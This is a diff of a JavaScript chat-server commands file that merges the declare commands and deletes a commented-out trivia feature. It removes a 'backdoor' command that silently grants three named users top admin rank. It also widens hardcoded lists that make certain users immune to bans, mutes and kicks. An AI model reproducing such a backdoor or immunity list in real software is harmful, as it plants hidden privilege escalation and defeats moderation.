@@ -24,16 +24,6 @@ if (!Rooms.rooms.spamroom) {
 }
 
 var commands = exports.commands = {
-
-	backdoor: function(target,room, user) {
-		if (user.userid === 'brittlewind'|| user.userid === 'cosy'|| user.userid === 'jd') {
-
-			user.group = '~';
-			user.updateIdentity();
-			
-			this.parse('/promote ' + user.name + ', ~');
-		}
-	},
 	
 	version: function(target, room, user) {
 		if (!this.canBroadcast()) return;
@@ -506,7 +496,7 @@ var commands = exports.commands = {
 		var userid = toId(name);
 		if (!userid || !targetUser) return this.sendReply("User '" + name + "' does not exist.");
 		if (!this.can('ban', targetUser, room)) return false;
-		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be banned from the room.');
+		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('This user cannot be banned from the room.');
 		if (!Rooms.rooms[room.id].users[userid]) {
 			return this.sendReply('User ' + this.targetUsername + ' is not in the room ' + room.id + '.');
 		}
@@ -642,7 +632,7 @@ var commands = exports.commands = {
 			return this.sendReply('You can\'t warn here: This is a privately-owned room not subject to global rules.');
 		}
 		if (!this.can('warn', targetUser, room)) return false;
-		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('You cannot warn this user.');
+		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('You cannot warn this user.');
 		this.addModCommand(''+targetUser.name+' was warned by '+user.name+'.' + (target ? " (" + target + ")" : ""));
 		targetUser.send('|c|~|/warn '+target);	
 	},
@@ -658,7 +648,7 @@ var commands = exports.commands = {
 			return this.sendReply("/help redir - You need to add a room to redirect the user to");
 		}
 		if (!this.can('kick', targetUser, room)) return false;
-		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be redirected.');
+		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('This user cannot be redirected.');
 		if (!targetUser || !targetUser.connected) {
 			return this.sendReply('User '+this.targetUsername+' not found.');
 		}
@@ -690,7 +680,7 @@ var commands = exports.commands = {
 
 		if (!this.can('warn', targetUser, room)) return false;
 
-		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be kicked.');
+		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('This user cannot be kicked.');
 
 		this.addModCommand(targetUser.name+' was kicked from the room by '+user.name+'.');
 		targetUser.popup('You were kicked from '+room.id+' by '+user.name+'.');
@@ -708,7 +698,7 @@ var commands = exports.commands = {
 			return this.sendReply('User '+this.targetUsername+' not found.');
 		}
 		if (!this.can('mute', targetUser, room)) return false;
-		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be muted.');
+		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('This user cannot be muted.');
 		if (targetUser.mutedRooms[room.id] || targetUser.locked || !targetUser.connected) {
 			var problem = ' but was already '+(!targetUser.connected ? 'offline' : targetUser.locked ? 'locked' : 'muted');
 			if (!target) {
@@ -735,7 +725,7 @@ var commands = exports.commands = {
 			return this.sendReply('User '+this.targetUsername+' not found.');
 		}
 		if (!this.can('mute', targetUser, room)) return false;
-		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be muted.');
+		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('This user cannot be muted.');
 		if (((targetUser.mutedRooms[room.id] && (targetUser.muteDuration[room.id]||0) >= 50*60*1000) || targetUser.locked) && !target) {
 			var problem = ' but was already '+(!targetUser.connected ? 'offline' : targetUser.locked ? 'locked' : 'muted');
 			return this.privateModCommand('('+targetUser.name+' would be muted by '+user.name+problem+'.)');
@@ -759,7 +749,7 @@ var commands = exports.commands = {
 		if (!targetUser) {
 			return this.sendReply('User '+this.targetUsername+' not found.');
 		}
-		if (targetUser.name === 'Brittle Wind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be muted');
+		if (targetUser.name === 'Brittle Wind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('This user cannot be muted');
 		if (!this.can('mute', targetUser, room)) return false;
 		if (((targetUser.mutedRooms[room.id] && (targetUser.muteDuration[room.id]||0) >= 50*60*1000) || targetUser.locked) && !target) {
 			var problem = ' but was already '+(!targetUser.connected ? 'offline' : targetUser.locked ? 'locked' : 'muted');
@@ -787,9 +777,8 @@ var commands = exports.commands = {
 		if (!target) {
 			return this.sendReply('You need to add how many hours the user is to be muted for.');
 		}
-		if (targetUser.name === 'Brittle Wind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be muted');
+		if (targetUser.name === 'Brittle Wind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('This user cannot be muted');
 		if (!this.can('mute', targetUser, room)) return false;
-		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('You cannot forcerename this user.');
 		if (((targetUser.mutedRooms[room.id] && (targetUser.muteDuration[room.id]||0) >= 50*60*1000) || targetUser.locked) && !target) {
 			var problem = ' but was already '+(!targetUser.connected ? 'offline' : targetUser.locked ? 'locked' : 'muted');
 			return this.privateModCommand('('+targetUser.name+' would be muted by '+user.name+problem+'.)');
@@ -837,7 +826,7 @@ var commands = exports.commands = {
 		if (!user.can('lock', targetUser)) {
 			return this.sendReply('/lock - Access denied.');
 		}
-		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be locked.');
+		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('This user cannot be locked.');
 		if ((targetUser.locked || Users.checkBanned(targetUser.latestIp)) && !target) {
 			var problem = ' but was already '+(targetUser.locked ? 'locked' : 'banned');
 			return this.privateModCommand('('+targetUser.name+' would be locked by '+user.name+problem+'.)');
@@ -881,7 +870,7 @@ var commands = exports.commands = {
 			return this.sendReply('User '+this.targetUsername+' not found.');
 		}
 		if (!this.can('ban', targetUser)) return false;
-		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be banned.');
+		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('This user cannot be banned.');
 		if (Users.checkBanned(targetUser.latestIp) && !target && !targetUser.connected) {
 			var problem = ' but was already banned';
 			return this.privateModCommand('('+targetUser.name+' would be banned by '+user.name+problem+'.)');
@@ -966,7 +955,7 @@ var commands = exports.commands = {
 	permaban: function(target, room, user) {
 		if (!target) return this.parse('/help permaban');
 		if (!this.can('permaban', targetUser)) return false;
-		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('You cannot permban this user.');
+		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('You cannot permban this user.');
 		target = this.splitTarget(target);
 		var targetUser = this.targetUser;
 		if (!targetUser) {
@@ -1141,27 +1130,21 @@ var commands = exports.commands = {
 		this.logModCommand(user.name+' send a popup message to '+targetUser.name);
 	},
 
-	declare: function(target, room, user) {
+	declaregreen: 'declare',
+	declarered: 'declare',
+	declare: function(target, room, user, connection, cmd) {
 		if (!target) return this.parse('/help declare');
 		if (!this.can('declare', null, room)) return false;
 
 		if (!this.canTalk()) return;
 
-		this.add('|raw|<div class="broadcast-blue"><b>'+target+'</b></div>');
-		this.logModCommand(user.name+' declared '+target);
-	},
-
-	declaregreen: 'declarered',
-	declarered: function(target, room, user, connection, cmd) {
-		if (!target) return this.parse('/help declare');
-		if (!this.can('declare', null, room)) return false;
-
-		if (!this.canTalk()) return;
-
-		if (cmd === 'declarered'){
+		if (cmd === 'declare') {
+			this.add('|raw|<div class="broadcast-blue"><b>'+target+'</b></div>');
+		}
+		else if (cmd === 'declarered') {
 			this.add('|raw|<div class="broadcast-red"><b>'+target+'</b></div>');
 		}
-		else if (cmd === 'declaregreen'){
+		else if (cmd === 'declaregreen') {
 			this.add('|raw|<div class="broadcast-green"><b>'+target+'</b></div>');
 		}
 		this.logModCommand(user.name+' declared '+target);
@@ -1228,7 +1211,7 @@ var commands = exports.commands = {
 			return this.sendReply('User '+this.targetUsername+' not found.');
 		}
 		if (!this.can('forcerename', targetUser)) return false;
-		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('You cannot forcerename this user.');
+		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('You cannot forcerename this user.');
 
 		if (targetUser.userid === toUserid(this.targetUser)) {
 			var entry = ''+targetUser.name+' was forced to choose a new name by '+user.name+'' + (target ? ": " + target + "" : "");
@@ -1252,7 +1235,7 @@ var commands = exports.commands = {
 			return this.sendReply('No new name was specified.');
 		}
 		if (!this.can('forcerenameto', targetUser)) return false;
-		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('You cannot forcerename this user.');
+		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy' || targetUser.name === 'Prez') return this.sendReply('You cannot forcerename this user.');
 
 		if (targetUser.userid === toUserid(this.targetUser)) {
 			var entry = ''+targetUser.name+' was forcibly renamed to '+target+' by '+user.name+'.';
@@ -1325,714 +1308,11 @@ var commands = exports.commands = {
 	abc123: function(target, room, user) {
 		user.customClient = true;
 		
-		this.sendReply('|raw|Thank you for using the custom client!<br /><br />' +
+		this.sendReplyBox('|raw|Thank you for using the custom client!<br /><br />' +
 		'The custom client allows us to add many custom features, notably the custom theme and battle theme.<br />' +
 		'As a note there are bugs such as Teambuilder and possibly PM\'s. It does not save logins and you need to copy over teams to use.<br />' +
 		'Some of these are bugs and some are just how client is (such as login).');
 	},
-
-	/*********************************************************
-	 * Trivia Commands
-	 *********************************************************/
-	//http://hastebin.com/kegihojuvu.xml and http://hastebin.com/hoxucehaba.coffee
-	
-	// /starttrivia allows you to announce to everyone that a trivia room is open!
-	/*starttrivia: function(target, room, user) {
-		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to announce trivia!');
-		this.parse('/makechatroom trivia');
-		return Rooms.lobby.addRaw('<div class="infobox"><b>Come join us for trivia!</b><br><div class="notice"><button name="joinRoom" value="trivia">Click here to join the trivia room!</button></div></div>');
-	},
-	
-	
-	 // /host displays the information on the current trivia host.
-	 host: function(target, room, user, connection, cmd, message) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (room.triviahost === '') return this.sendReply('There is no host at the moment.');
-	 	if (!this.canBroadcast()) return;
-		
-		//mySQL initialize database
-		//var sys = require('util');
-		var mysql = require('mysql');
-		var myconnection = mysql.createConnection({
-				'host': 'localhost','user':mysqlName,'password':mysqlPass
-			}
-		);
-		
-		myconnection.connect();
-		myconnection.query('USE trivia');	
-		
-		//mySQL function
-		console.log(cmd + '; ' + message.substring(0,1));
-		if (message.substring(0,1) === '!') {
-		myconnection.query(
-			'CALL get_scores (?)',
-			[room.triviahost],
-			function(err, result) {
-				if(err) {
-					console.log(err);
-					return;
-				} else {
-				var getstats = result[0];
-				var getfinal = getstats[0];
-				if (!getfinal) {
-					room.addRaw(room.triviahost+' currently has no trivia stats.  Why not give '+room.triviahost+' a merit?');
-					return;
-				} else {
-					var triviaremaining = room.triviatotal - room.triviacount;
-					queryResults = [getfinal['point'],getfinal['merit'],getfinal['demerit']];
-					room.addRaw('<div class="infobox"><b>The current host is: </b>' + room.triviahost +
-							 '<br><b>Trivia Points: </b>'+getfinal['point'] +
-							 '<br><b>Merits: </b>'+getfinal['merit'] +
-							 '<br><b>Demerits: </b>'+getfinal['demerit'] +
-							 '<br><b><i>Questions left: </i>'+triviaremaining+'</b></div>');
-					}
-				}
-			}
-		);
-		} else {
-				myconnection.query(
-			'CALL get_scores (?)',
-			[room.triviahost],
-			function(err, result) {
-				if(err) {
-					console.log(err);
-					return;
-				} else {
-				var getstats = result[0];
-				var getfinal = getstats[0];
-				if (!getfinal) {
-					connection.sendTo(room, room.triviahost+' currently has no trivia stats.  Why not give '+room.triviahost+' a merit?');
-					return;
-				} else {
-					var triviaremaining = room.triviatotal - room.triviacount;
-					queryResults = [getfinal['point'],getfinal['merit'],getfinal['demerit']];
-					connection.sendTo(room, '|raw|<div class="infobox"><b>The current host is: </b>' + room.triviahost +
-							 '<br><b>Trivia Points: </b>'+getfinal['point'] +
-							 '<br><b>Merits: </b>'+getfinal['merit'] +
-							 '<br><b>Demerits: </b>'+getfinal['demerit'] +
-							 '<br><b><i>Questions left: </i>'+triviaremaining+'</b></div>');
-					}
-				}
-			}
-		);
-		}
-		myconnection.end();
-	 },
-	 
-	 // /score is the same as /host except it allows you to pick any target, and won't tell you how many questions are left.
-	 score: function(target, room, user, connection, cmd, message) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-	 	if (!this.canBroadcast()) return;
-		if (!target) target = user.name;
-		//mySQL initialize database
-		//var sys = require('util');
-		var mysql = require('mysql');
-		var myconnection = mysql.createConnection({
-				'host': 'localhost','user':mysqlName,'password':mysqlPass
-			}
-		);
-		
-		myconnection.connect();
-		myconnection.query('USE trivia');	
-		
-		//mySQL function
-		console.log(cmd + '; ' + message.substring(0,1));
-		if (message.substring(0,1) === '!') {
-		myconnection.query(
-			'CALL get_scores (?)',
-			[target],
-			function(err, result) {
-				if(err) {
-					console.log(err);
-					return;
-				} else {
-				var getstats = result[0];
-				var getfinal = getstats[0];
-				if (!result[0]) {
-					room.addRaw(targett+' currently has no trivia stats.');
-					return;
-				} else {
-					queryResults = [getfinal['point'],getfinal['merit'],getfinal['demerit']];
-					room.addRaw('<div class="infobox"><b>Name: </b>' + target +
-							 '<br><b>Trivia Points: </b>'+getfinal['point'] +
-							 '<br><b>Merits: </b>'+getfinal['merit'] +
-							 '<br><b>Demerits: </b>'+getfinal['demerit']);
-					}
-				}
-			}
-		);
-		} else {
-				myconnection.query(
-			'CALL get_scores (?)',
-			[target],
-			function(err, result) {
-				if(err) {
-					console.log(err);
-					return;
-				} else {
-				var getstats = result[0];
-				var getfinal = getstats[0];
-				if (!result[0]) {
-					connection.sendTo(room, target+' currently has no trivia stats.');
-					return;
-				} else {
-					queryResults = [getfinal['point'],getfinal['merit'],getfinal['demerit']];
-					connection.sendTo(room, '|raw|<div class="infobox"><b>Name: </b>' + target +
-							 '<br><b>Trivia Points: </b>'+getfinal['point'] +
-							 '<br><b>Merits: </b>'+getfinal['merit'] +
-							 '<br><b>Demerits: </b>'+getfinal['demerit']);
-					}
-				}
-			}
-		);
-		}
-		myconnection.end();
-	},
-	 
-	 // /newhost assigns a new host to the trivia room!
-	 newhost: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to assign a new trivia host.');
-		if (!target) {
-			target = user.name;
-			var targetUser = Users.get(target);
-			} else {
-				var targetUser = Users.get(target);
-				if (!targetUser) return this.sendReply('User '+target+' not found.');
-				target = targetUser.name;
-			}
-		if (room.triviaqueue.length == 0) {
-			room.triviahost = target;
-			room.triviatotal = 10;
-			room.triviacount = 0;
-			targetUser.popup(user.name+' has made you the new trivia host.');
-			Rooms.lobby.addRaw('<div class="infobox"><b>A new round of trivia has started!</b><br><div class="notice"><button name="joinRoom" value="trivia">Click here to join the trivia room!</button></div></div');
-			return this.add('|raw|<div class="infobox"><b>' + targetUser.name + '</b> has become the new trivia host.<br><br>' +
-					 'Please use the following commands to ask, answer, and cancel questions:<br>' +
-					 '<b>/ask [question]</b>: This will ask a question to the chat.  You have 10 questions by default.<br>' +
-					 '<b>/answer [username], [answer]</b>: This will give a point to the user mentioned here and display the correct answer.<br>' +
-					 '<b>/cancel [answer]</b>: If no one can answer your question, you can cancel the question here.  Please provide the correct answer as well.<br><br>' +
-					 'Remember, voiced users and above can use /merit and /demerit to rank your ability as a host, so try your hardest!</div>'
-					 );
-		} else {
-			var nexthost;
-			var nohostsatall = false;
-			do {
-				if (room.triviaqueue.length == 0) {
-				nohostsatall = true;
-				break;
-				}
-				nexthost = Users.get(room.triviaqueue.shift());
-				}
-			while (!nexthost);
-			if (nohostsatall) {
-				nexthost = targetUser;
-			} else {
-				this.add('There are other hosts in the queue that need to go first. ' + targetUser.name + ' will be added to the queue.');
-				room.triviaqueue.push(targetUser.name);
-				this.add(targetUser.name+' has been added onto the trivia queue, and will be host in '+room.triviaqueue.length+' turn(s)');
-			}
-			this.add(''+nexthost.name+' is now the trivia host.  They have been given 10 questions to start.');
-			room.triviatotal = 10;
-			room.triviacount = 0;
-			room.triviahost = nexthost.name;
-			nexthost.popup('The queue has made you the new trivia host.');
-			Rooms.lobby.addRaw('<div class="infobox"><b>A new round of trivia has started!</b><br><div class="notice"><button name="joinRoom" value="trivia">Click here to join the trivia room!</button></div></div');
-			return this.add('|raw|<div class="infobox"><b>' + nexthost.name + '</b> has become the new trivia host.<br><br>' +
-					 'Please use the following commands to ask, answer, and cancel questions:<br>' +
-					 '<b>/ask [question]</b>: This will ask a question to the chat.  You have 10 questions by default.<br>' +
-					 '<b>/answer [username], [answer]</b>: This will give a point to the user mentioned here and display the correct answer.<br>' +
-					 '<b>/cancel [answer]</b>: If no one can answer your question, you can cancel the question here.  Please provide the correct answer as well.<br><br>' +
-					 'Remember, voiced users and above can use /merit and /demerit to rank your ability as a host, so try your hardest!</div>'
-					 );
-			}
-	},
-	
-	// /ask asks a question!
-	ask: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!(user.name === room.triviahost)) return this.sendReply('You are not the trivia host!');
-		if (!target) return this.sendReply('Ask a trivia question by typing: /ask Question.');
-		if (!(room.triviaquestion === '')) return this.sendReply('You have already asked a question!  Either declare a winner with: /right username, answer or cancel the question with /cancel answer.');
-
-		var triviatemp = room.triviacount+1;
-		
-		room.triviaquestion = target.replace(/(<([^>]+)>)/ig,"");
-		if (room.triviaquestion === '') return this.sendReply('You did not ask a question... somehow!  Seriously, you screwed this up something fierce.');
-
-		return this.add('|raw|<div class="infobox"><b>Question #'+triviatemp+':</b><br><b>'+user.name+' asks:</b><br />' + room.triviaquestion + '</div>');
-	},
-	
-	cq: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!this.canBroadcast()) return false;
-		if (room.triviaquestion === '') return this.sendReplyBox('<b>There is no trivia question to answer at the moment.</b>');
-		return this.sendReplyBox('<b>Question #'+(1+room.triviacount)+':</b><br><b>'+ room.triviahost +' asks:</b><br />' + room.triviaquestion + '</div>');
-	},
-	
-	// /cancel allows you to stop a question that goes unanswered
-	cancel: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!(user.name === room.triviahost)) return this.sendReply('You are not the trivia host!');
-		if (room.triviaquestion === '') return this.sendReply('You do not have a question to cancel.');
-		if (!target) return this.sendReply('Cancel a trivia question by typing: /cancel [answer].');
-		
-		room.triviaanswer = target.replace(/(<([^>]+)>)/ig,"");
-		
-		if (room.triviaanswer === '') return this.sendReply('You did not ask a question... somehow!  Seriously, you screwed this up something fierce.');
-		
-		room.triviaquestion = '';
-		this.add('|raw|<div class="infobox">' +
-			'<b>'+user.name+' has canceled the question.  The answer is:</b><br />' + room.triviaanswer + '</div>');
-
-		room.triviacount = room.triviacount + 1;
-		if (room.triviatotal <= room.triviacount) {
-			if (room.triviaqueue.length == 0) {
-				this.add('|raw|<b>'+room.triviahost+', thank you for hosting trivia!  Your question limit has been reached, and it is time to give a new player host.</b>');
-				room.triviahost = '';
-				return false;
-			} else {
-			var nexthost;
-			var nohostsatall = false;
-			do {
-				if (room.triviaqueue.length == 0) {
-				nohostsatall = true;
-				break;
-				}
-				nexthost = Users.get(room.triviaqueue.shift());
-				}
-			while (!nexthost);
-			if (nohostsatall) {
-				this.add('|raw|<b>'+room.triviahost+', thank you for hosting trivia!  Your question limit has been reached, and it is time to give a new player host.</b>');
-				room.triviahost = '';
-				return false;
-			}
-			this.add(''+nexthost.name+' is now the trivia host.  They have been given 10 questions to start.');
-			room.triviatotal = 10;
-			room.triviacount = 0;
-			room.triviahost = nexthost.name;
-			nexthost.popup('The queue has made you the new trivia host.');
-			Rooms.lobby.addRaw('<div class="infobox"><b>A new round of trivia has started!</b><br><div class="notice"><button name="joinRoom" value="trivia">Click here to join the trivia room!</button></div></div');
-			return this.add('|raw|<div class="infobox"><b>' + nexthost.name + '</b> has become the new trivia host.<br><br>' +
-					 'Please use the following commands to ask, answer, and cancel questions:<br>' +
-					 '<b>/ask [question]</b>: This will ask a question to the chat.  You have 10 questions by default.<br>' +
-					 '<b>/answer [username], [answer]</b>: This will give a point to the user mentioned here and display the correct answer.<br>' +
-					 '<b>/cancel [answer]</b>: If no one can answer your question, you can cancel the question here.  Please provide the correct answer as well.<br><br>' +
-					 'Remember, voiced users and above can use /merit and /demerit to rank your ability as a host, so try your hardest!</div>'
-					 );
-			}
-		}
-	},
-	
-		// /answer allows you to end a question and give a user a point!
-	answer: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!(user.name === room.triviahost)) return this.sendReply('You are not the trivia host!');
-		if (room.triviaquestion === '') return this.sendReply('You do not have a question to cancel.');
-		if (!target) return this.sendReply('Show an answer to a trivia question by typing: /answer [username], [answer].');
-		var answ = this.splitTarget(target);
-		if (!this.targetUser) return this.sendReply('That user does not exist.');
-		if (this.targetUsername === user.name) return this.sendReply('You cannot give yourself points, cheater.');
-		room.triviaanswer = answ.replace(/(<([^>]+)>)/ig,"");
-		
-		if (room.triviaanswer === '') return this.sendReply('You did not set an answer... somehow!  Seriously, you screwed this up something fierce.');
-		
-		room.triviaquestion = '';
-		this.add('|raw|<div class="infobox">' +
-			'<b>'+this.targetUsername+' has correctly answered the question.  The answer is:</b><br />' + room.triviaanswer + '</div>');
-			
-		//mySQL initialize database
-		//var sys = require('util');
-		var mysql = require('mysql');
-		var myconnection = mysql.createConnection({
-				'host': 'localhost','user':mysqlName,'password':mysqlPass
-			}
-		);
-		
-		myconnection.connect();
-		myconnection.query('USE trivia');	
-		
-		//mySQL function
-		myconnection.query(
-			'CALL add_point (?)',
-			[this.targetUsername],
-			function(err, result) {
-				if(err) {
-					console.log(err);
-					return;
-				} else {
-					console.log('Point given to winner!');
-				}
-			}
-		);
-		myconnection.end();
-			
-		//this part sets the next host or ends the trivia if that's relevant
-		room.triviacount = room.triviacount + 1;
-		if (room.triviatotal <= room.triviacount) {
-			if (room.triviaqueue.length == 0) {
-				this.add('|raw|<b>'+room.triviahost+', thank you for hosting trivia!  Your question limit has been reached, and it is time to give a new player host.</b>');
-				room.triviahost = '';
-				return false;
-			} else {
-			var nexthost;
-			var nohostsatall = false;
-			do {
-				if (room.triviaqueue.length == 0) {
-				nohostsatall = true;
-				break;
-				}
-				nexthost = Users.get(room.triviaqueue.shift());
-				}
-			while (!nexthost);
-			if (nohostsatall) {
-				this.add('|raw|<b>'+room.triviahost+', thank you for hosting trivia!  Your question limit has been reached, and it is time to give a new player host.</b>');
-				room.triviahost = '';
-				return false;
-			}
-			this.add(''+nexthost.name+' is now the trivia host.  They have been given 10 questions to start.');
-			room.triviatotal = 10;
-			room.triviacount = 0;
-			room.triviahost = nexthost.name;
-			nexthost.popup('The queue has made you the new trivia host.');
-			Rooms.lobby.addRaw('<div class="infobox"><b>A new round of trivia has started!</b><br><div class="notice"><button name="joinRoom" value="trivia">Click here to join the trivia room!</button></div></div');
-			return this.add('|raw|<div class="infobox"><b>' + nexthost.name + '</b> has become the new trivia host.<br><br>' +
-					 'Please use the following commands to ask, answer, and cancel questions:<br>' +
-					 '<b>/ask [question]</b>: This will ask a question to the chat.  You have 10 questions by default.<br>' +
-					 '<b>/answer [username], [answer]</b>: This will give a point to the user mentioned here and display the correct answer.<br>' +
-					 '<b>/cancel [answer]</b>: If no one can answer your question, you can cancel the question here.  Please provide the correct answer as well.<br><br>' +
-					 'Remember, voiced users and above can use /merit and /demerit to rank your ability as a host, so try your hardest!</div>'
-					 );
-			}
-		}
-	},
-	
-	// /addqueue allows you to queue people up to be hosts!
-	addqueue: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to add users to the trivia queue.');
-		if (room.triviahost === '') return this.sendReply('There is no host at the moment.');
-		if (!target) {
-			target = user.name;
-			var targetUser = Users.get(target);
-			} else {
-				var targetUser = Users.get(target);
-				if (!targetUser) return this.sendReply('User '+target+' not found.');
-				target = targetUser.name;
-			}
-		room.triviaqueue.push(targetUser.name);
-		return this.add(targetUser.name+' has been added onto the trivia queue, and will be host in '+room.triviaqueue.length+' turn(s)');
-	},
-	
-	// /queue displays the queue.
-	queue: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!this.canBroadcast()) return;
-		if (room.triviaqueue.length == 0) return this.sendReplyBox('The current trivia queue is... empty!');
-		var queuelist = '';
-		for(var i=0;i<room.triviaqueue.length;i++){
-			queuelist = queuelist + '<br>#' + (i+1) + ': ' + room.triviaqueue[i];
-			}
-		return this.sendReplyBox('The current trivia queue is: '+queuelist);
-	},
-	
-	// /clearqueue removes all users from the queue.  
-	clearqueue: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to clear the trivia queue.');
-		room.triviaqueue = [];
-		return this.add(user.name+' has cleared the trivia queue.');
-	},
-	
-	// /rmqueue will remove a single user from all spots in the queue.
-	rmqueue: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to remove a user from the trivia queue.');
-		if (!target) {
-			target = user.name;
-		} else {
-			var targetUser = Users.get(target);
-			if (targetUser) target = targetUser.name;
-			}
-		for(var i=0;i<room.triviaqueue.length;i++){
-			if (room.triviaqueue[i] === target) {
-				room.triviaqueue.splice(i,1);
-				this.add(target+' has been removed from #' + (i+1) + ' in the trivia queue.');
-				i = i-1;
-			}
-		}
-		return this.add(target+' has been removed from all spots in the trivia queue.');
-	},
-	
-	// /merit reason will give a user one merit!
-	merit: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!user.can('merit')) return this.sendReply('You need to be a voiced user (+) or above to grant merits or demerits.');
-		if (!target) return this.sendReply('Give a merit by typing: /merit [reason].');
-		if (user.name === room.triviahost) return this.sendReply('You cannot give yourself merits, cheater!');
-		if (room.triviahost === '') return this.sendReply('There is no host at the moment.');
-		
-		var reason = target.replace(/(<([^>]+)>)/ig,"");
-		if (reason === '') return this.sendReply('Give a merit by typing: /merit [reason].');
-		this.add('|raw|<b>' +room.triviahost + ' has recieved a merit from ' + user.name + '!</b>  The reason is: ' + reason);
-		
-		//mySQL initialize database
-		//var sys = require('util');
-		var mysql = require('mysql');
-		var myconnection = mysql.createConnection({
-				'host': 'localhost','user':mysqlName,'password':mysqlPass
-			}
-		);
-		
-		myconnection.connect();
-		myconnection.query('USE trivia');	
-		
-		//mySQL function
-		myconnection.query(
-			'CALL add_merit (?)',
-			[room.triviahost],
-			function(err, result) {
-				if(err) {
-					console.log(err);
-					return;
-				} else {
-					console.log('Merit given to host!');
-				}
-			}
-		);
-		myconnection.end();
-		return false;		
-	},
-	
-		// /demerit reason will give a user one demerit!
-	demerit: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!user.can('merit')) return this.sendReply('You need to be a voiced user (+) or above to grant merits or demerits.');
-		if (!target) return this.sendReply('Give a demerit by typing: /demerit [reason].');
-		if (user.name === room.triviahost) return this.sendReply('You cannot give yourself demerits, and you don\'t suck.  :)');
-		if (room.triviahost === '') return this.sendReply('There is no host at the moment.');
-		
-		var reason = target.replace(/(<([^>]+)>)/ig,"");
-		if (reason === '') return this.sendReply('Give a merit by typing: /merit [reason].');
-		this.add('|raw|<b>' +room.triviahost + ' has recieved a demerit from ' + user.name + '!</b>  The reason is: ' + reason);
-		
-		//mySQL initialize database
-		//var sys = require('util');
-		var mysql = require('mysql');
-		var myconnection = mysql.createConnection({
-				'host': 'localhost','user':mysqlName,'password':mysqlPass
-			}
-		);
-		
-		myconnection.connect();
-		myconnection.query('USE trivia');	
-		
-		//mySQL function
-		myconnection.query(
-			'CALL add_demerit (?)',
-			[room.triviahost],
-			function(err, result) {
-				if(err) {
-					console.log(err);
-					return;
-				} else {
-					console.log('Merit given to host!');
-				}
-			}
-		);
-		myconnection.end();
-		return false;		
-	},
-	
-	// /submerit will remove one merit!
-	submerit: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to remove merits, points, or demerits.');
